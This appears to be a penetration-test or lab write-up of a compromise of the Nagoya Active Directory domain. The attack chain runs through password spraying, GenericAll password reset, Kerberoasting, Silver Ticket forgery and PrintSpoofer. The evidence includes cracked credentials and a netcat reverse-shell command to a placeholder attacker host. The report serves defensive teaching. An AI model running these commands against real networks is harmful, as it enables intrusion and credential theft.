
# Nagoya – Active Directory Domain Compromise

## Internal Network Penetration Test Report

**Target:** Nagoya Industries Domain Controller
**Domain:** nagoya-industries.com
**Assessment Type:** Internal Penetration Test
**Author:** Tanvir Ahmed
**Date:** 2026

---

# Executive Summary

An internal penetration test was conducted against the **Nagoya Industries Active Directory environment** to evaluate the impact of potential authentication weaknesses and privilege misconfigurations.

The assessment revealed several vulnerabilities that allowed an attacker to escalate privileges from an unauthenticated network position to **Domain Administrator**.

The compromise was achieved through the following attack chain:

* Domain user enumeration from publicly available information
* Password spraying leading to valid domain credentials
* Abuse of excessive Active Directory permissions
* Kerberos service ticket extraction
* SQL Server exploitation
* Kerberos ticket forgery
* Privilege escalation to SYSTEM

These weaknesses ultimately enabled full compromise of the domain controller.

### Business Impact

If exploited in a production environment, an attacker could:

* Gain unauthorized access to domain resources
* Extract credentials for multiple domain accounts
* Execute arbitrary commands on domain systems
* Escalate privileges to Domain Administrator
* Maintain persistent control of the network

This represents a **critical risk to the confidentiality, integrity, and availability of enterprise systems**.

---

# Scope

| Target         | Description       |
| -------------- | ----------------- |
| 192.168.144.21 | Domain Controller |

Domain:

```
nagoya-industries.com
```

Testing assumptions:

* Internal network access
* No initial credentials
* Limited prior knowledge of the environment

---

# Methodology

The assessment followed a structured penetration testing methodology aligned with industry standards such as:

* OWASP Testing Guide
* NIST Penetration Testing Framework

### Testing Phases

1. Network reconnaissance
2. Service enumeration
3. User enumeration
4. Credential attacks
5. Active Directory enumeration
6. Privilege escalation
7. Domain compromise validation

### Tools Used

* Nmap
* Kerbrute
* BloodHound
* Impacket
* Hashcat
* Chisel
* Evil-WinRM

---

# Attack Path Overview

The following attack chain was successfully executed during testing:

```
User Enumeration
      ↓
Password Spraying
      ↓
Valid Domain Credentials
      ↓
Active Directory Enumeration
      ↓
GenericAll Permission Abuse
      ↓
Kerberoasting
      ↓
SQL Server Exploitation
      ↓
Silver Ticket Attack
      ↓
Privilege Escalation
      ↓
Domain Compromise
```

---

# Findings

---

# Finding 1 – Weak Password Policy

**Severity:** High

### Description

Password spraying attacks against enumerated domain users revealed valid credentials for multiple accounts.

### Evidence

```
andrea.hayes : Nagoya2023
fiona.clark : Summer2023
```
<img width="1306" height="734" alt="image" src="https://github.com/user-attachments/assets/79b3bf46-fe05-4e9e-8707-b2b2d6ecbf2c" />

### Impact

Attackers could authenticate to domain services using compromised credentials and gain a foothold within the environment.

### Recommendation

* Implement strong password complexity requirements
* Enforce account lockout policies
* Monitor authentication attempts for password spraying activity

---

# Finding 2 – Excessive Active Directory Permissions

**Severity:** Critical

### Description

The user account `fiona.clark` possessed **GenericAll privileges** over the service account `svc_helpdesk`.

This permission allowed attackers to reset the password of the service account.

### Evidence

```
rpcclient -U "fiona.clark%Summer2023" 192.168.144.21
setuserinfo2 svc_helpdesk 23 Password1
```
<img width="1287" height="544" alt="image" src="https://github.com/user-attachments/assets/de484a6a-484e-4892-b9a3-e2063ffcc84d" />

### Impact

Attackers could take control of privileged service accounts and escalate privileges within the domain.

### Recommendation

* Apply the principle of least privilege
* Regularly audit delegated Active Directory permissions
* Remove unnecessary GenericAll privileges

---

# Finding 3 – Kerberos Service Account Exposure

**Severity:** High

### Description

Kerberos service ticket hashes were retrieved using the **Kerberoasting technique**, allowing offline password cracking.

### Evidence

```
GetUserSPNs.py -dc-ip 192.168.144.21 nagoya-industries.com/fiona.clark:Summer2023
```
<img width="1230" height="252" alt="image" src="https://github.com/user-attachments/assets/f2defbbc-74ad-43d6-8217-9508fb5c1ca7" />

Cracked credentials:

```
svc_helpdesk : Password1
svc_mssql : Service1
```
<img width="1288" height="720" alt="image" src="https://github.com/user-attachments/assets/6021fcda-8528-4b1d-9385-3a27d21c05cc" />

### Impact

Attackers could recover plaintext passwords for service accounts.

### Recommendation

* Use long randomly generated passwords for service accounts
* Implement Managed Service Accounts where possible
* Monitor Kerberos ticket requests

---

# Finding 4 – SQL Server Exposure

**Severity:** Medium

### Description

SQL Server was running locally on the domain controller and accessible through port forwarding.

### Evidence

```
netstat -ano | Select-String "1433"
```
<img width="1246" height="304" alt="image" src="https://github.com/user-attachments/assets/da0921cb-c51c-4249-ab11-975686fd3fd0" />

Access was established via:

```
mssqlclient.py svc_mssql:Service1@127.0.0.1 -windows-auth
```
<img width="1239" height="382" alt="image" src="https://github.com/user-attachments/assets/6ce1d981-f9aa-4145-91ea-a1c1e4701422" />

### Impact

Attackers could interact with the SQL server and further escalate privileges.

### Recommendation

* Restrict SQL server access
* Implement network segmentation
* Monitor SQL authentication events

---

# Finding 5 – Kerberos Ticket Forgery (Silver Ticket)

**Severity:** Critical

### Description

Using the NTLM hash of the SQL service account, a **Silver Ticket attack** was performed to impersonate a privileged user.

### Evidence

```
ticketer.py -nthash <hash> -domain nagoya-industries.com -spn MSSQL/nagoya.nagoya-industries.com
```
<img width="1281" height="488" alt="image" src="https://github.com/user-attachments/assets/90e4dd20-c2f2-4441-b225-11467e03834c" />

### Impact

Attackers could authenticate as administrative users without contacting the domain controller.

### Recommendation

* Rotate compromised service account credentials
* Monitor Kerberos authentication anomalies
* Limit service account privileges

---

# Finding 6 – Privilege Escalation to SYSTEM

**Severity:** Critical

### Description

The attacker escalated privileges on the compromised system using **PrintSpoofer**, resulting in SYSTEM-level access.

### Evidence

```
PrintSpoofer.exe -c "nc.exe attacker_ip 8000 -e cmd"
```
<img width="603" height="145" alt="image" src="https://github.com/user-attachments/assets/ec130dba-1218-49ce-85de-ef5245b7495e" />

### Impact

SYSTEM access allowed full control over the domain controller.

### Recommendation

* Apply security patches
* Restrict privileged service access
* Monitor suspicious privilege escalation activity

---

# Recommendations Summary

| Priority | Recommendation                                 |
| -------- | ---------------------------------------------- |
| Critical | Remove excessive Active Directory permissions  |
| Critical | Rotate compromised service account credentials |
| High     | Implement strong password policies             |
| High     | Monitor Kerberos ticket requests               |
| Medium   | Restrict SQL server access                     |
| Medium   | Monitor privilege escalation activity          |

---

# Conclusion

The Nagoya Active Directory environment contained multiple security weaknesses that allowed an attacker to escalate privileges and obtain full control over the domain controller.

Starting from an unauthenticated network position, it was possible to:

* Enumerate domain users
* Obtain valid credentials through password spraying
* Abuse misconfigured Active Directory permissions
* Extract service account credentials
* Forge Kerberos tickets
* Escalate privileges to SYSTEM

Immediate remediation of these vulnerabilities is recommended to protect the domain infrastructure from compromise.
